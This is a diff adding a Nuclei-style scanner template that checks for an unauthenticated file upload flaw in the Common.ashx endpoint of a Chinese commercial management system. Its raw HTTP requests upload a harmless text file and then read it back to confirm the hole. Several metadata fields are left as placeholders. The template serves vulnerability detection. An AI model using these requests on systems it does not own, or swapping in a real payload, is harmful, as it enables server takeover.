@@ -1,0 +1,39 @@
+id: jgy-Common-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 九垠赢+商业管理系统 Common.ashx 存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /System/Common.ashx?type=savefile&path={{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6
+        Content-Length: 165
+
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6
+        Content-Disposition: form-data; name="content";
+        Content-Type: text/plain
+
+        testupload
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6--
+      - |+
+        GET /System/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'testupload'
+      - type: status
+        status:
+          - 200
